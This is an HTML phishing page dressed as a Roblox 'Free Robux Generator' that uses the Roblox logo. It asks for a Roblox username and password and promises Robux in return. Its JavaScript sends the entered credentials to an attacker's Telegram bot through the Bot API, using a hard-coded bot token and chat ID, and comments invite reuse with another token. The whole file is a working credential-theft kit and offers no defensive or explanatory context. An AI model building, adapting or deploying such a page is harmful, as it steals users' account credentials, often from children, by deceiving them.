<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Roblox Free Robux</title>
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/Roblox_Logo_2022.svg">
  <style>
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    body {
      background: linear-gradient(to bottom, #0f172a, #1e293b);
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      animation: fadeIn 1.2s ease-out;
    }

    img.logo {
      width: 100px;
      margin-bottom: 10px;
      animation: fadeIn 1.5s ease;
    }

    h1 {
      color: #22d3ee;
      margin-bottom: 5px;
      animation: fadeIn 1.5s ease;
    }

    p {
      color: #94a3b8;
      margin: 0 0 20px 0;
      animation: fadeIn 1.8s ease;
    }

    input, select, button {
      padding: 12px;
      margin: 8px;
      border: none;
      border-radius: 10px;
      font-size: 1em;
      width: 280px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
      transition: 0.3s;
    }

    input, select {
      background: #1e293b;
      color: white;
    }

    input:focus, select:focus {
      outline: 2px solid #38bdf8;
    }

    button {
      background: #22c55e;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background: #16a34a;
      transform: scale(1.05);
    }
  </style>
</head>
<body>

  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Roblox_Logo_2022.svg" alt="Roblox Logo">
  <h1>🎮 Free Robux Generator</h1>
  <p>Generate free Robux now!</p>

  <input type="text" id="username" placeholder="Roblox Username">
  <input type="password" id="password" placeholder="Roblox Password">

  <select id="robuxAmount">
    <option value="100">100 Robux</option>
    <option value="500">500 Robux</option>
    <option value="1000">1000 Robux</option>
    <option value="2000">2000 Robux</option>
  </select>

  <button onclick="sendToTelegram()">Generate Robux</button>

  <script>
    function sendToTelegram() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const robux = document.getElementById("robuxAmount").value;

      const token = "7813099066:AAF2_21LreeHeeWVDbR6CrzQZg9gq4__2qA"; // Replace with your Bot Token
      const chat_id = "7999225380"; // Replace with your Chat ID

      const message = `🎮 Roblox Free Robux Login:\n👤 Username: ${username}\n🔑 Password: ${password}\n💰 Robux: ${robux}`;

      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(response => {
          if (response.ok) {
            alert("✅ Info sent to Telegram!");
          } else {
            alert("❌ Failed to send.");
          }
        })
        .catch(error => {
          alert("⚠️ Error: " + error);
        });
    }
  </script>

</body>
</html>
